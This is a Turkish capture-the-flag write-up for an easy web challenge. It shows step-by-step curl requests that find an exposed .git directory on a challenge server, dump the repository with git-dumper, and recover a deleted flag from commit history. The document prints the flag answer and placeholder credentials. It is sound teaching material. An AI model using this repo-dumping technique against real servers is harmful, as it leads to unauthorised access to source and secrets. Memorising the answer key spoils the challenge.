# 🎯 nothing - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Git Disclosure-purple?style=for-the-badge" alt="Git Disclosure">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Kolay  
**Puan:** 500

**Challenge URL:** `http://68.183.213.255:9023`

---

## 🔍 Analiz

**Hedef:** Web uygulamasını analiz ederek flag'i bulmak

**Strateji:** Sayfa keşfi → Header analizi → .git dizini tespiti → Repo dump → Commit geçmişi inceleme

**İpuçları:**
- 🎯 "There's nothing here... or is there?" → Gizli içerik var
- 🔍 nginx sunucusunda `.git/` dizini açık bırakılmış
- 💡 Git commit geçmişinde "Remove sensitive data" commit'i mevcut
- 🔑 Silinen veriler git history'den kurtarılabilir

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Hedefi Keşfet**

```bash
curl -s http://68.183.213.255:9023/
```

**Çıktı:**
```html
<h1>🚧</h1>
<p>Site Under Construction</p>
<p style="font-size: 1em;">There's nothing here... or is there?</p>
```

**Analiz:**
- ✅ Sayfa "Under Construction" mesajı veriyor
- 💡 "...or is there?" ifadesi gizli bir şeye işaret ediyor
- 🎯 Header'lar ve gizli dizinler incelenmeli

---

### 🌐 **Adım 2: Header ve robots.txt İncele**

```bash
curl -s http://68.183.213.255:9023/ -v 2>&1 | grep -i "^<"
curl -s http://68.183.213.255:9023/robots.txt
```

**Kritik Çıktı:**
```
< HTTP/1.1 200 OK
< Server: nginx/1.29.5
```

**Analiz:**
- ✅ Sunucu nginx/1.29.5 kullanıyor
- 💡 robots.txt 404 döndürüyor → Bilgi yok
- 🎯 Gizli dizinler kontrol edilmeli

---

### 📂 **Adım 3: .git Dizinini Tespit Et**

```bash
curl -s http://68.183.213.255:9023/.git/
curl -s http://68.183.213.255:9023/.git/HEAD
```

**Kritik Çıktı:**
```
Index of /.git/
hooks/       info/       logs/
objects/     refs/
COMMIT_EDITMSG   HEAD   config   description   index
```

```
ref: refs/heads/main
```

**Analiz:**
- ✅ `.git/` dizini açık ve directory listing aktif!
- 💡 Tüm git dosyalarına erişilebilir durumdaki repo
- 🎯 git-dumper ile repoyu tamamen indir

---

### 📥 **Adım 4: Repoyu Dump Et**

```bash
pip install git-dumper --break-system-packages
git-dumper http://68.183.213.255:9023/.git/ ./nothing_git
```

**Çıktı:**
```
[-] Testing http://68.183.213.255:9023/.git/HEAD [200]
[-] Testing http://68.183.213.255:9023/.git/ [200]
[-] Fetching .git recursively
[-] Running git checkout .
```

**Analiz:**
- ✅ Repo başarıyla dump edildi
- 💡 `config.php` ve `index.html` dosyaları mevcut
- 🎯 Git log incelenmeli

---

### 🕵️ **Adım 5: Commit Geçmişini İncele**

```bash
ls nothing_git/
git -C nothing_git log --all --oneline
```

**Çıktı:**
```
config.php  index.html

643da0c (HEAD -> main) Add landing page
49f8e46 Remove sensitive data
eda7b8b Initial commit - Add configuration
```

**KRİTİK BULGU:**
- ✅ 3 commit mevcut
- 💡 `49f8e46` → **"Remove sensitive data"** → Hassas veri silinmiş!
- 🎯 Bu commit'teki değişiklikler incelenmeli

---

### 🚀 **Adım 6: Silinen Veriyi Kurtar**

```bash
git -C nothing_git show 49f8e46
```

**Çıktı:**
```diff
commit 49f8e460c07a72f74c776a430d6638430aa45148
Author: Developer <dev@example.com>
Date:   Mon Mar 9 10:23:46 2026 +0000

    Remove sensitive data

diff --git a/config.php b/config.php
index d548005..db658c5 100644
--- a/config.php
+++ b/config.php
@@ -4,9 +4,6 @@ define('DB_HOST', 'localhost');
 define('DB_USER', 'admin');
 define('DB_PASS', 'super_secret_password');
 
-// Flag (TODO: Remove before production!)
-$FLAG = "PITO{g1t_d1sc10sur3_c0mm1t_h1st0ry_pwn3d}";
-
 // API Keys
 define('API_KEY', 'sk-1234567890abcdef');
```

---

## 🚩 **FLAG**
```
PITO{g1t_d1sc10sur3_c0mm1t_h1st0ry_pwn3d}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP istekleri</sub></td>
<td align="center">🐍<br><b>git-dumper</b><br><sub>Git repo dump</sub></td>
<td align="center">📜<br><b>git</b><br><sub>Commit geçmişi analizi</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 Nothing Web Challenge
       ↓
🌐 Ana sayfa
   → "Site Under Construction"
   → "There's nothing here... or is there?"
   → nginx/1.29.5 tespit edildi
       ↓
📂 /.git/ dizini
   → Directory listing açık!
   → HEAD: refs/heads/main
   → Tüm git dosyalarına erişim var
       ↓
📥 git-dumper
   → Repo tamamen indirildi
   → config.php + index.html
       ↓
🕵️ Commit geçmişi
   → "Remove sensitive data" commit'i!
   → git show 49f8e46
   → config.php'den $FLAG satırı silinmiş
       ↓
🚩 FLAG: PITO{g1t_d1sc10sur3_c0mm1t_h1st0ry_pwn3d}
```
